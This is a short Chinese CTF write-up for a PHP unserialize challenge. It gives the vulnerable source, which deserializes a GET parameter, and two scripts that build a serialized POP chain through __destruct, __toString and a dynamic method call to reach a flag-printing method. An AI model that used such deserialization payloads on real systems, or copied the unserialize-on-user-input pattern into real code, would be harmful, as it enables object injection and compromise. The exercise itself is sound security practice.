#


源码:

```php
<?php

error_reporting(0);
show_source("index.php");

class w44m{

    private $admin = 'aaa';
    protected $passwd = '123456';

    public function Getflag(){
        if($this->admin === 'w44m' && $this->passwd ==='08067'){
            include('flag.php');
            echo $flag;
        }else{
            echo $this->admin;
            echo $this->passwd;
            echo 'nono';
        }
    }
}

class w22m{
    public $w00m;
    public function __destruct(){
        echo $this->w00m; //输出$w00m的内容
    }
}

class w33m{
    public $w00m;
    public $w22m;
    public function __toString(){
        // $this->w22m 是一个公共属性，其值被用作方法名。这意味着代码尝试调用 $this->w00m 对象的名为 $this->w22m 的方法。
        // PHP 允许通过属性或变量来动态指定方法名。这种调用方式是通过大括号 {} 语法实现的，例如 $obj->{$methodName}。
        $this->w00m->{$this->w22m}();
        return 0;
    }
}

$w00m = $_GET['w00m'];
unserialize($w00m);

?>
```

```php

<?php
class w44m{

    private $admin = 'w44m';
    protected $passwd = '08067';
}

class w22m{
    public $w00m; 
    public function __construct()
    {
        $this->w00m=new w33m(); //$w00m的内容设置为 new w33m();
    }
}

class w33m{
    public $w00m;
    public $w22m="Getflag"; //会执行$w00m的Getflag方法
    public function __construct()
    {
        $this->w00m=new w44m();// 吧$w00m设置为新的w44m对象
    }
}
$a=new w22m();
echo urlencode(serialize($a));
?>

```


__toString 是一个魔术方法，它在对象被当作字符串使用时自动调用
1, 使用 echo 或 print
2, 使用字符串方法
3, 赋值给字符串变量


__destruct
当对象被序列化时，__destruct 方法不会被调用。序列化是为了保存对象的状态，而不是销毁它。

自己写的playload

```php
<?php

class w44m{
    private $admin = 'w44m';
    protected $passwd = '08067';
}

class w22m{
    public $w00m;
    public function __construct(){
        $this->w00m = new w33m();
    }
}

class w33m{
    public $w00m;
    public $w22m;

    public function __construct(){
        $this->w00m = new w44m();
        $this->w22m = 'GetFlag';
    }
}

$a = new w22m();
echo serialize($a);
echo urlencode(serialize($a));

// 目的执行w44m的GetFlag方法
// 在w33m中, echo时, $w00m可调用$w22m方法
// 所以把 $w00m设置为new w44m(); $w22m设置为GetFlag方法;
// w22m会直接输出自己的变量值 $w22m = new w33m();
?>

```
